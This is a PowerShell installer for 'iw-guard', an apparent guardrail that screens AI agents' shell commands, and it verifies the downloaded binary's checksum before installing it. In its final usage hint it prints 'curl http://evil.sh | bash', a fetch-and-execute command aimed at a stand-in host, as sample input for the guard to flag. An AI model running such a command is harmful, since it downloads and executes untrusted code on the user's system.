<#
.SYNOPSIS
  Install the InnerWarden AI-agent guardrail (iw-guard) on Windows.

.DESCRIPTION
  Downloads the signed iw-guard.exe for this machine's architecture from the
  GitHub release, verifies its SHA-256 against the published sidecar, installs it
  to %LOCALAPPDATA%\Programs\InnerWarden, and adds that directory to the user PATH.

  This installs ONLY the guardrail (screen an AI agent's shell command / MCP tool
  call for danger). The Linux host-EDR (eBPF sensor, Execution Gate) is Linux-only
  and is not part of the Windows build.

.PARAMETER Version
  Release tag to install (e.g. v0.15.35). Defaults to the latest release.

.EXAMPLE
  irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex

.EXAMPLE
  .\install.ps1 -Version v0.15.35
#>
[CmdletBinding()]
param(
  [string]$Version = "latest"
)

$ErrorActionPreference = "Stop"
$repo = "InnerWarden/innerwarden"

# Architecture -> release asset name.
$arch = if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { "aarch64" } else { "x86_64" }
$asset = "iw-guard-windows-$arch.exe"

if ($Version -eq "latest") {
  $base = "https://github.com/$repo/releases/latest/download"
} else {
  $base = "https://github.com/$repo/releases/download/$Version"
}

$tmp = Join-Path ([IO.Path]::GetTempPath()) ("iw-guard-" + [Guid]::NewGuid().ToString("N"))
New-Item -ItemType Directory -Force -Path $tmp | Out-Null
$exePath = Join-Path $tmp "iw-guard.exe"
$shaPath = "$exePath.sha256"

try {
  Write-Host "Downloading $asset ($Version)..."
  Invoke-WebRequest -Uri "$base/$asset" -OutFile $exePath -UseBasicParsing
  Invoke-WebRequest -Uri "$base/$asset.sha256" -OutFile $shaPath -UseBasicParsing

  # Verify the SHA-256 against the published sidecar (lowercase hex, no filename).
  $want = (Get-Content -Raw $shaPath).Trim().ToLower()
  $got = (Get-FileHash $exePath -Algorithm SHA256).Hash.ToLower()
  if ($want -ne $got) {
    throw "SHA-256 mismatch for $asset`n  expected: $want`n  got:      $got"
  }
  Write-Host "Checksum OK ($got)."

  # Install to a stable per-user location and add it to PATH.
  $installDir = Join-Path $env:LOCALAPPDATA "Programs\InnerWarden"
  New-Item -ItemType Directory -Force -Path $installDir | Out-Null
  $dest = Join-Path $installDir "iw-guard.exe"
  Copy-Item $exePath $dest -Force
  Write-Host "Installed to $dest"

  $userPath = [Environment]::GetEnvironmentVariable("Path", "User")
  if (($userPath -split ';') -notcontains $installDir) {
    [Environment]::SetEnvironmentVariable("Path", "$userPath;$installDir", "User")
    Write-Host "Added $installDir to your user PATH (open a new terminal to pick it up)."
  }

  Write-Host ""
  Write-Host "Done. Try it:"
  Write-Host "  iw-guard check `"curl http://evil.sh | bash`""
  Write-Host "  iw-guard --help"
}
finally {
  Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
}
